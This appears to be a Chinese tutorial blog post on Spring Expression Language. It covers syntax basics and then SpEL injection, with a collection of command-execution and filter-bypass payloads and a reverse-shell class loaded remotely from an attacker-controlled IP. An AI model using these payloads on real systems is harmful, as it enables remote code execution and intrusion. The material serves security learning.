---
title: SpEL表达式注入
date: 2026-10-03
---

# SpEL 表达式注入

## SpEL 表达式基础

### 简介

在 Spring3 中引入了 Spring 表达式语言（Spring Expression Language，简称 SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于 XML 和基于注解的 Spring 配置还有 bean 定义一起使用。

在 Spring 系列产品中，SpEL 是表达式计算的基础，实现了与 Spring 生态系统所有产品的无缝对接。Spring 框架的核心功能之一就是通过依赖注入的方式来管理 Bean 之间的依赖关系，而 SpEL 可以方便快捷地对`ApplicationContext`中的 Bean 进行属性的装配和提取。由于它能够在运行时动态分配值，因此可以节省大量 Java 代码。

SpEL 有许多特性：

- 使用 Bean 的 id 来引用 Bean
- 可调用方法和访问对象的属性
- 可对值进行算数、关系和逻辑运算
- 可使用正则表达式进行匹配
- 可进行集合操作

**补充一下什么是对象图**

在 Java 中，对象之间会相互引用，形成一张网：

```java
class User {
    String name;
    Address address;   // 引用另一个对象
}
class Address {
    String city;
    Country country;   // 又引用另一个对象
}
class Country {
    String code;
}
```

如果我们有一个`user`对象，通过它就能一路就下去：

```text
user → address → country → code
```

这一串通过引用连接起来的对象网络，就叫做对象图。图中的每一个节点是一个对象，每条边是一个引用（字段）。

SpEL 可以让我们用一段字符串表达式，在这张图上面导航、取值、调用方法，而不是写一堆 Java 代码。

### SpEL 定界符—— #{}

SpEL 使用`#{}`作为定界符，所有在大括号中的字符都将被认为是 SpEL 表达式，在其中可以使用 SpEL 运算符、变量、引用 Bean 及其属性和方法等。

这里需要注意`#{}`和`${}`的区别：

- `#{}`就是 SpEL 的定界符，用于指明内容为 SpEL 表达式并执行
- `${}`主要用于加载外部属性文件中的值
- 两者可以混合使用，但是必须`#{}`在外面，`${}`在里面，比如`#{'${}'}`，注意单引号是字符串类型才添加的

## SpEL 表达式类型

### 字面值

最简单的 SpEL 表达式就是仅包含一个字面值。

下面我们在 XML 配置文件中使用 SpEL 设置类属性的值为字面值，此时需要用到`#{}`定界符，注意若是指定为字符串的话需要添加单引号：

```xml
<property name="message1" value="#{666}"/>
<property name="message2" value="#{'John'}"/>
```

也可以和字符串混合使用：

```xml
<property name="message" value="the value is #{666}"/>
```

Java 基本数据类型都可以出现在 SpEL 表达式中，表达式中的数字也可以使用科学计数法：

```xml
<property name="salary" value="#{1e4}"/>
```

#### 样例代码

```java
package org.example;

public class HelloWorld {
    private String message;

    public void getMessage() {
        System.out.println("Message: "+message);
    }

    public void setMessage(String message) {
        this.message = message;
    }
}
```

Demo.xml：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="helloWorld" class="org.example.HelloWorld">
        <property name="message" value="#{'solo'} is #{19}"/>
    </bean>
</beans>
```

测试：

```java
import org.example.HelloWorld;
import org.springframework.context.support.ClassPathXmlApplicationContext;

public class test {
    public static void main(String[] args) {
        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("Demo.xml");
        HelloWorld helloWorld = context.getBean("helloWorld", HelloWorld.class);
        helloWorld.getMessage();
    }
}
```

### 引用 Bean、属性和方法

#### 引用 Bean

SpEL 表达式能够通过其他 Bean 的 id 进行引用，直接在`#{}`符号中写入 id 名即可，无需添加单引号，比如：

原来的写法是：

```xml
<constructor-arg ref="test"/>
```

在 SpEL 表达式中就是：

```xml
<constructor-arg value="#{test}"/>
```

##### 引用类属性

SpEL 能够访问类的属性，比如：

```xml
<bean id="kenny" class="com.spring.entity.Instrumentalist"
    p:song="May Rain"
    p:instrument-ref="piano"/>
<bean id="solo" class="com.spring.entity.Instrumentalist">
    <property name="instrument" value="#{kenny.instrument}"/>
    <property name="song" value="#{kenny.song}"/>
</bean>
```

key 指定 `kenny<bean>` 的 id，value 指定 `kenny<bean>`的 song 属性。其等价于执行下面的代码：

```java
Instrumentalist carl = new Instrumentalist();
carl.setSong(kenny.getSong());
```

##### 引用类方法

SpEL 表达式还可以访问类的方法。

假设现在有个`SongSelector`类，该类有个`selectSong()`方法，这样的话就不需要进行模仿，直接调用`songSelector`就行了：

```xml
<property name="song" value="#{SongSelector.selectSong()}"/>
```

```xml
<property name="song" value="#{SongSelector.selectSong().toUpperCase()}"/>
```

但是我们这里不能确保不跑出`NullPointerException`，为了避免这个问题，我们可以使用 SpEL 的`null-safe`存取器：

```xml
<property name="song" value="#{SongSelector.selectSong()?.toUpperCase()}"/>
```

`?.`符号会确保左边的表达式不会为`null`，如果为`null`就不会调用`toUpperCase()`方法了。

##### Demo —— 引用 Bean

这里基于构造函数的依赖注入。

```java
package org.example;

public class SpellChecker {
    public SpellChecker() {
        System.out.println("Inside SpellChecker constructor.");
    }
    
    public void checkSpelling() {
        System.out.println("Inside checkSpelling." );
    }
}
```

```java
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="spellChecker" class="org.example.SpellChecker"/>
    <bean id="textEditor" class="org.example.TextEditor">
        <constructor-arg value="#{spellChecker}"/>
    </bean>
</beans>
```

测试：

```java
import org.example.TextEditor;
import org.springframework.context.support.ClassPathXmlApplicationContext;

public class RefSpellAndEditor {
    public static void main(String[] args) {
        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("editor.xml");
        TextEditor te = (TextEditor) context.getBean("textEditor");
        te.spellCheck();
    }
}
```

#### 类类型表达式

在 SpEL 表达式中，使用`T(Type)`运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。

使用`T(Type)`来表示`java.lang.Class`实例，`Type`必须是类全限定名，但`java.lang`包除外，因为 SpEL 已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。

> 这里就存在攻击点了。因为`java.lang.Runtime`这个包也是在`java.lang`包里的，所以如果能调用`Runtime`就能进行命令执行。

在 XML 配置文件中的使用示例，要调用`java.lang.Math`来获取随机数：

```xml
<property name="random" value="#{T(java.lang.Math).random()}"/>
```

Expression 中使用示例：

```java
ExpressionParser parser = new SpelExpressionParser();
// java.lang 包类访问
Class<String> result1 = parser.parseExpression("T(String)").getValue(Class.class);
System.out.println(result1);
//其他包类访问
String expression2 = "T(java.lang.Runtime).getRuntime().exec('open /Applications/Calculator.app')";
Class<Object> result2 = parser.parseExpression(expression2).getValue(Class.class);
System.out.println(result2);
//类静态字段访问
int result3 = parser.parseExpression("T(Integer).MAX_VALUE").getValue(int.class);
System.out.println(result3);
//类静态方法调用
int result4 = parser.parseExpression("T(Integer).parseInt('1')").getValue(int.class);
System.out.println(result4);
```

##### Demo

把 Demo.xml 给修改一下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="helloWorld" class="org.example.HelloWorld">
        <property name="message" value="#{'solo'} is #{T(java.lang.Math).random()}"/>
    </bean>
</beans>
```

##### 恶意利用 —— 弹计算器

修改 value 中类类型表达式的类为`Runtime`并调用其命令执行方法即可：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="helloWorld" class="org.example.HelloWorld">
        <property name="message" value="#{'solo'} is #{T(java.lang.Runtime).getRuntime.exec('calc')}"/>
    </bean>
</beans>
```

这样就能弹出计算器。

## SpEL 用法

SpEL 的用法有三种形式，一种是在注解`@Value`中，一种是 XML 配置，最后一种是在代码中使用 Expression。

上面就是以 XML 配置为例对 SpEL 表达式的用法进行的说明，而注解`@Value`的用法例子如下：

```java
public class EmailSender {
    @Value("${spring.mail.username}")
    private String mailUsername;
    @Value("#{ systemProperties['user.region'] }")    
    private String defaultLocale;
    //...
}
```

这种形式的值一般是在 properties 的配置文件中的。下面看 Expression 的用法。

### Expression 用法

后续分析的各种 Spring CVE 漏洞都是基于 Expression 形式的 SpEL 表达式注入，因此这里再单独说明 SpEL 表达式 Expression 这种形式的用法。

#### 步骤

SpEL 在求表达式值时一般分为四步，其中第三步可选：**首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。**

```java
ExpressionParser parser = new SpelExpressionParser();
Expression expression = parser.parseExpression("('Hello' + ' solo').concat(#end)");
EvaluationContext context = new StandardEvaluationContext();
context.setVariable("end", "!");
System.out.println(expression.getValue(context));
```

具体步骤：

1. 创建解析器：SpEL 使用`ExpressionParser`接口表示解析器，提供`SpelExpressionParser`默认实现
2. 解析表达式：使用`ExpressionParser`的`parseExpression`来解析相应的表达式为`Expression`对象
3. 构造上下文：准备比如变量定义等等表达式需要的上下文数据
4. 求值：通过`Expression`接口的`getValue`方法根据上下文获得表达式值

简单分析这个代码：

`parser.parseExpression("('Hello' + ' solo').concat(#end)")`用解析器解析字符串，这个字符串是由`Hello`、`solo`和`end`变量拼接得到的。`#`开头表示从上下文中取一个变量。

`EvaluationContext context = new StandardEvaluationContext()`是在创建求值时的环境，表达式中用到的变量、根对象、方法解析器都是从这里找的。

然后就是注册变量并且通过`getValue`执行表达式。

##### 主要接口

- **ExpressionParser 接口：**表示解析器，默认实现是`org.springframework.expression.spel.standard`包中的`SpelExpressionParser`类，使用`parseExpression`方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符
- **EvaluationContext 接口**：表示上下文环境，默认实现是`org.springframework.expression.spel.support`包中的`StandardEvaluationContext`类，使用`setRootObject`方法来设置根对象，使用`setVariable`方法来注册自定义变量，使用`registerFunction`方法注册自定义方法
- **Expression 接口**：表示表达式对象，默认实现是`org.springframework.expression.spel.standard`包中的`SpelExpression`，提供`getValue`方法用于获取表达式值，提供`setValue`方法用于设置对象值

##### Demo

这里和前面 XML 配置的用法区别在于程序会将这里传入`parseExpression()`方法的字符串参数当作 SpEL 表达式来解析，而无需通过`#{}`来注明：

```java
package org.example;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class ExpressionCalc {

    public static void main(String[] args) {
        String spel = "T(java.lang.Runtime).getRuntime.exec('calc')";
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(spel);
        System.out.println(expression.getValue());
    }
}
```

##### 类实例化

类实例化同样使用 Java 关键字`new`，类名必须是全限定名，但`java.lang`包内的类除外。

```java
package org.example;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class ExpressionCalc {

    public static void main(String[] args) {
        String spel = "new java.util.Date()";
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(spel);
        System.out.println(expression.getValue());
    }
}
```

### SpEL 表达式运算

 SpEL 提供了以下几种运算符：

| 运算符类型 | 运算符                               |
| ---------- | ------------------------------------ |
| 算数运算   | +, -, *, /, %, ^                     |
| 关系运算   | <, >, ==, <=, >=, lt, gt, eq, le, ge |
| 逻辑运算   | and, or, not, !                      |
| 条件运算   | ?:(ternary), ?:(Elvis)               |
| 正则表达式 | matches                              |

#### 算数运算

加法运算：

```xml
<property name="add" value="#{counter.total+42}"/>
```

加法也可以用于字符串拼接：

```xml
<property name="blogName" value="#{'my blog name is'+' '+'mrBird' }"/>
```

`^`运算符执行幂运算，其余算数运算符和 Java 一模一样，这里不再赘述。

#### 关系运算

判断一个 Bean 的某个值是否等于100：

```xml
<property name="eq" value="#{counter.total==100}"/>
```

返回值是 boolean 类型。关系运算符唯一要注意的是：在 Spring XML 配置文件中直接写`>=`和`<=`会报错。因为`<`和`>`这两个符号在 XML 中有特殊的含义，所以在实际使用的时候，最好使用文本类型代替符号：

| 运算符   | 符号 | 文本类型 |
| -------- | ---- | -------- |
| 等于     | ==   | eq       |
| 小于     | <    | lt       |
| 小于等于 | <=   | le       |
| 大于     | >    | gt       |
| 大于等于 | >=   | ge       |

比如：

```XML
<property name="eq" value="#{counter.total le 100}"/>
```

#### 逻辑运算

SpEL 表达式提供了多种逻辑运算符，其含义和 Java 一样，只是符号不同。

使用`and`运算符：

```xml
<property name="largeCircle" value="#{shape.kind == 'circle' and shape.perimeter gt 10000}"/>
```

两边都为 true 时才返回 true。

其余操作一样，只不过非运算有`not`和`!`两种符号可供选择：

```xml
<property name="outOfStack" value="#{!product.available}"/>
```

#### 条件运算

条件运算符类似于 Java 的三目运算符：

```xml
<property name="instrument" value="#{songSelector.selectSong() == 'May Rain' ? piano:saxphone}"/>
```

当选择的歌曲为”May Rain”的时候，一个 id 为 piano 的 Bean 将装配到 `instrument` 属性中，否则一个 id 为 saxophone 的 Bean 将装配到 `instrument` 属性中。注意区别 piano 和字符串 “piano”！

一个常见的三目运算符的使用场景是判断是否为`null`：

```xml
<property name="song" value="#{kenny.song !=null ? kenny.song:'Jingle Bells'}"/>
```

在以上示例中，如果 `kenny.song` 不为 null，那么表达式的求值结果是 `kenny.song` 否则就是 “Jingle Bells”。

#### 正则表达式

验证邮箱：

```xml
<property name="email" value="#{admin.email matches '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.com'}"/>
```

### 集合操作

SpEL 表达式支持对集合进行操作。

先创建一个 City 类：

```java
package com.solo.pojo;

public class City {
    private String name;
    private String state;
    private int population;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getState() {
        return state;
    }

    public void setState(String state) {
        this.state = state;
    }

    public int getPopulation() {
        return population;
    }

    public void setPopulation(int population) {
        this.population = population;
    }
}
```

创建一个`city.xml`，使用`<util:list>`元素配置一个包含 City 对象的 List 集合：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:p="http://www.springframework.org/schema/p"
       xmlns:util="http://www.springframework.org/schema/util"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util-4.0.xsd">

    <util:list id="cities">
        <bean class="com.solo.pojo.City" p:name="Chikago"
              p:state="IL" p:population="2853114"/>
        <bean class="com.solo.pojo.City" p:name="Atlanta"
              p:state="GA" p:population="537958"/>
        <bean class="com.solo.pojo.City" p:name="Dallas"
              p:state="TX" p:population="1279910"/>
        <bean class="com.solo.pojo.City" p:name="Houston"
              p:state="TX" p:population="2242193"/>
        <bean class="com.solo.pojo.City" p:name="Odessa"
              p:state="TX" p:population="90943"/>
        <bean class="com.solo.pojo.City" p:name="El Paso"
              p:state="TX" p:population="613190"/>
        <bean class="com.solo.pojo.City" p:name="Jal"
              p:state="NM" p:population="1996"/>
        <bean class="com.solo.pojo.City" p:name="Las Cruces"
              p:state="NM" p:population="91865"/>
    </util:list>
    
</beans>
```

#### 访问集合成员

SpEL 表达式支持通过`#{集合ID[i]}`的方式来访问集合中的成员。

定义一个 ChoseCity 类：

```java
package com.solo.pojo;

public class ChoseCity {
    private City city;

    public City getCity() {
        return city;
    }

    public void setCity(City city) {
        this.city = city;
    }
}
```

在`city.xml`中，选取集合中的某一个成员，并赋值给 city 属性中，这个语句要写在 util 之外：

```xml
<bean id="choseCity" class="com.solo.pojo.ChoseCity">
    <property name="city" value="#{cities[0]}"/>
</bean>
```

启动器：

```java
import com.solo.pojo.ChoseCity;
import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

public class CityDemo {
    public static void main(String[] args) {
        ApplicationContext context = new ClassPathXmlApplicationContext("city.xml");
        ChoseCity c = context.getBean("choseCity", ChoseCity.class);
        System.out.println(c.getCity().getName());
    }
}
```

随机选择一个 city，中括号`[]`运算符始终通过索引访问集合中的成员：

```xml
<property name="city" value="#{cities[T(java.lang.Math).random()*cities.size()]}"/>
```

此时会随机访问一个集合成员变量并输出。

`[]`运算符同样可以用来获取`java.util.Map`集合中的成员。例如，假设`City`对象**以其名字作为键**放入`Map`集合中，在这种情况下，我们可以像下面那样获取键为`Dallas`的`entry`：

```xml
<property name="chosenCity" value="#{cities['Dallas']}"/>
```

`[]`运算符的另一种用法是从`java.util.Properties`集合中取值。例如，假设我们需要通过`<util:properties>`元素在 Spring 中加载一个 properties 配置文件：

```xml
<util:properties id="settings" loaction="classpath:settings.properties"/>
```

现在要在这个配置文件 Bean 中访问一个名为 `twitter.accessToken` 的属性：

```xml
<property name="accessToken" value="#{settings['twitter.accessToken']}"/>
```

`[]`运算符同样可以通过索引来得到某个字符串的某个字符：

```java
'This is a test'[3]
```

#### 查询集合成员

SpEL 表达式中提供了查询运算符来实现查询符合条件的集合成员：

- `.?[]`：返回所有符合条件的集合成员；
- `.^[]`：从集合查询中查出第一个符合条件的集合成员；
- `.$[]`：从集合查询中查出最后一个符合条件的集合成员；

新建一个`ListChoseCity`：

```java
package com.solo.pojo;

import java.util.List;

public class ListChoseCity {
    private List<City> city;

    public List<City> getCity() {
        return city;
    }

    public void setCity(List<City> city) {
        this.city = city;
    }
}
```

修改一下 city.xml：

```xml
<bean id="listChoseCity" class="com.solo.pojo.ListChoseCity">
    <property name="city" value="#{cities.?[population gt 100000]}"/>
</bean>
```

启动器：

```java
import com.solo.pojo.City;
import com.solo.pojo.ListChoseCity;
import org.springframework.context.support.ClassPathXmlApplicationContext;

public class ListCityDemo {
    public static void main(String[] args) {
        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("city.xml");
        ListChoseCity listChoseCity = context.getBean("listChoseCity", ListChoseCity.class);
        for (City city : listChoseCity.getCity()) {
            System.out.println(city.getName());
        }
    }
}
```

#### 集合投影

集合投影就是从集合的每一个成员中选择特定的属性放到一个新的集合中。SpEL 的投影运算符`.![]`完全可以做到这一点。

例如，我们仅需要包含城市名称的一个 String 类型的集合：

```xml
<property name="cityNames" value="#{cities.![name]}"/>
```

再比如得到城市名加州名的集合：

```xml
<property name="cityNames" value="#{cities.![name+','+state]}"/>
```

把符合条件的城市的名字和州名作为一个新的集合：

```xml
<property name="cityNames" value="#{cities.?[population gt 100000].![name+','+state]}"/>
```

```xml
<property name="cityNames" value="#{cities.?[population gt 100000].![name+','+state]}"/>
```

### 变量定义和引用

在 SpEL 表达式中，变量定义通过`EvaluationContext`类的`setVariable(variableName, value)`函数来实现；在表达式中使用`#variableName`来引用；除了引用自定义变量，SpEL 还允许引用根对象以及当前上下文对象：

- `#this`：使用当前正在计算的上下文
- `#root`：引用容器的 root 对象

### instanceof 表达式

SpEL 支持 instanceof 运算符，跟 Java 中使用同义，如`'hello' instanceof T(String)`将返回 true。

### 自定义函数

老版本的 Spring 只支持类静态方法注册为自定义函数。SpEL 使用`StandardEvaluationContext`的`registerFunction()`方法进行注册自定义方法，其实完全可以使用`setVariable`代替，两者本质是一样的。

比如自定义实现字符串反转的函数：

```java
package com.solo.pojo;

public class ReverseString {
    public static String reverseString(String input) {
        StringBuilder backwards = new StringBuilder();
        for (int i = 0; i < input.length(); i++) {
            backwards.append(input.charAt(input.length() - 1 - i));
        }
        return backwards.toString();
    }
}
```

方法注册到`StandardEvaluationContext`并使用：

```java
import com.solo.pojo.ReverseString;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;

public class CustomFunctionReverse {
    public static void main(String[] args) throws NoSuchMethodException {
        ExpressionParser parser = new SpelExpressionParser();
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.registerFunction("reverseString", ReverseString.class.getDeclaredMethod("reverseString", String.class));
        String value = parser.parseExpression("#reverseString('solo')").getValue(context, String.class);
        System.out.println(value);
    }
}
```

## SpEL 表达式漏洞注入

### 漏洞原理

`SimpleEvaluationContext`和`StandardEvaluationContext`是 SpEL 提供的两个`EvaluationContext`：

- `SimpleEvaluationContext`：针对不需要 SpEL 语言语法的全部范围并且应该受到有意限制的表达式类别，公开 SpEL 语言特性和配置选项的子集。
- `StandardEvaluationContext`：公开全套 SpEL 语言功能和配置选项。我们可以使用它来指定默认的根对象并配置每个可用的评估相关策略

`SimpleEvaluationContext` 旨在仅支持 SpEL 语言语法的一个子集，不包括 Java 类型引用、构造函数和 bean 引用；而 `StandardEvaluationContext` 是支持全部 SpEL 语法的。

SpEL 表达式是可以操作类及其方法的，可以通过类类型表达式`T(Type)`来调用任意类方法。这是因为在不指定`EvaluationContext`的情况下默认使用的是`StandardEvaluationContext`，而它包含了 SpEL 的所有功能，在允许用户控制输入的情况下可以造成任意命令执行。

之前提到过：

```java
public class BasicCalc {  
    public static void main(String[] args) {  
        String spel = "T(java.lang.Runtime).getRuntime().exec(\"calc\")";  
        ExpressionParser parser = new SpelExpressionParser();  
        Expression expression = parser.parseExpression(spel);  
        System.out.println(expression.getValue());  
    }  
}
```

### 通过反射的方式进行 SpEL 注入

因为这里的漏洞原理是调用任意类，所以我们可以通过反射的方式来展开攻击：

```java
import org.springframework.expression.Expression;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class ReflectBypass {
    public static void main(String[] args) {
        String spel = "T(String).getClass().forName('java.lang.Runtime').getRuntime().exec('calc')";
        SpelExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(spel);
        System.out.println(expression.getValue());
    }
}
```

### 基础 POC 与 Bypass

这里默认把定界符`#{}`去掉。

```java
// PoC原型
 
// Runtime
T(java.lang.Runtime).getRuntime().exec("calc")
T(Runtime).getRuntime().exec("calc")
 
// ProcessBuilder
new java.lang.ProcessBuilder({'calc'}).start()
new ProcessBuilder({'calc'}).start()
```

用`ProcessBuilder`来进行命令执行：

```java
public class ProcessBuilderBypass {  
    public static void main(String[] args) {  
        String spel = "new java.lang.ProcessBuilder(new String[]{\"calc\"}).start()";  
        ExpressionParser parser = new SpelExpressionParser();  
        Expression expression = parser.parseExpression(spel);  
        System.out.println(expression.getValue());  
    }  
}
```

#### 基础 Bypass

```java
// Bypass技巧
 
// 反射调用
T(String).getClass().forName("java.lang.Runtime").getRuntime().exec("calc")
 
// 同上，需要有上下文环境
#this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc")
 
// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤
T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})
 
// 同上，需要有上下文环境
#this.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})
 
// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1
// byte数组内容的生成后面有脚本
new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()
 
// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2
// byte数组内容的生成后面有脚本
T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))
```

#### JavaScript Engine Bypass

获取所有 js 引擎信息：

```java
import javax.script.ScriptEngineFactory;
import javax.script.ScriptEngineManager;
import java.util.List;

public class JsEngine {
    public static void main(String[] args) {
        ScriptEngineManager manager = new ScriptEngineManager();
        List<ScriptEngineFactory> factories = manager.getEngineFactories();
        for (ScriptEngineFactory factory : factories) {
            System.out.printf(
                    "Name: %s%n" + "Version: %s%n" + "Language name: %s%n" +
                            "Language version: %s%n" +
                            "Extensions: %s%n" +
                            "Mime types: %s%n" +
                            "Names: %s%n",
                    factory.getEngineName(),
                    factory.getEngineVersion(),
                    factory.getLanguageName(),
                    factory.getLanguageVersion(),
                    factory.getExtensions(),
                    factory.getMimeTypes(),
                    factory.getNames()
            );
        }
    }
}
```

运行之后的 Names 里可以看到所有的 js 引擎名称为`nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript`，所以`getEngineByName`的参数可以填这些名称：

```java
ScriptEngineManager sem = new ScriptEngineManager();
ScriptEngine engine = sem.getEngineByName("nashorn");
System.out.println(engine.eval("2+1"));
```

所以 payload 也就显而易见了：

```java
// JavaScript引擎通用PoC
T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")
 
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("xxx"),)
 
// JavaScript引擎+反射调用
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})),)
 
// JavaScript引擎+URL编码
// 其中URL编码内容为：
// 不加最后的getInputStream()也行，因为弹计算器不需要回显
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29")),)
```

`nashorn`作 Engine：

```java
String spel = "T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"nashorn\")" + 
".eval(\"s=[3];s[0]='cmd';" +  
"s[1]='/C';s[2]='calc';java.la\"+\"ng.Run\"+\"time.getRu\"+\"ntime().ex\"+\"ec(s);\")";
```

`javascript`作 Engine：

```java
new javax.script.ScriptEngineManager().getEngineByName("javascript").eval("s=[2];s[0]='open';s[1]='/System/Applications/Calculator.app';java.lang.Runtime.getRuntime().exec(s);
```

其他的一些 poc：

```java
// 黑名单过滤".getClass("，可利用数组的方式绕过
''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'calc')
 
// JDK9新增的shell
T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
```

### 通过 ClassLoader 类加载器构造 POC 与 Bypass

#### URLClassLoader 结合 SpEL 表达式注入

先构造一个 Exp.jar/Exp.class，放到远程 vps 即可。

利用构造函数反弹 shell：

```java
import java.io.IOException;

public class Exp {
    public Exp(String addr) throws IOException {
        addr = addr.replace(":","/");
        ProcessBuilder p = new ProcessBuilder("/bin/bash", "-c", "exec 5<>/dev/tcp/" + addr + ";cat <&5 | while read line; do $line 2>&5 >&5;done");
        p.start();

    }
}
```

然后起一个 http 服务。

```java
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;

public class ExpTest {
    public static void main(String[] args) {
        String spel = "new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"http://8.136.47.225:8999/\")}).loadClass(\"Exp\").getConstructors()[0].newInstance(\"8.136.47.225:2333\")";
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(spel);
        StandardEvaluationContext context = new StandardEvaluationContext();
        Object value = expression.getValue(context);
    }
}
```

vps 上监听2333端口即可。

#### AppClassLoader

- 加载 Runtime 执行

```java
T(ClassLoader).getSystemClassLoader().loadClass("java.lang.Runtime").getRuntime().exec("calc")
```

- 加载 ProcessBuilder 执行

```java
T(ClassLoader).getSystemClassLoader().loadClass("java.lang.ProcessBuilder").getConstructors()[1].newInstance(new String[]{"open","/System/Applications/Calculator.app"}).start()
```

#### 通过其他类获取 AppClassLoader

使用 SpEL 的话一定存在名为`org.springframework`的包，这个包下有很多类，这些类的类加载器就是 AppClassLoader。

比如`org.springframework.expression.Expression`类：

```java
System.out.println( org.springframework.expression.Expression.class.getClassLoader() );
```

那么就有一种获取 AppClassLoader 的方法：

```java
T(org.springframework.expression.Expression).getClass().getClassLoader()
```

假设使用 thyemleaf 的话会有`org.thymeleaf.context.AbstractEngineContext`：

```java
T(org.thymeleaf.context.AbstractEngineContext).getClass().getClassLoader()
```

如果有一个自定义的类：

```java
T(com.ctf.controller.Demo).getClass().getClassLoader()
```

#### 通过内置对象加载 URLClassLoader

```java
request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"touch /tmp/foobar\")

username[#this.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('xterm')")]=asdf
```

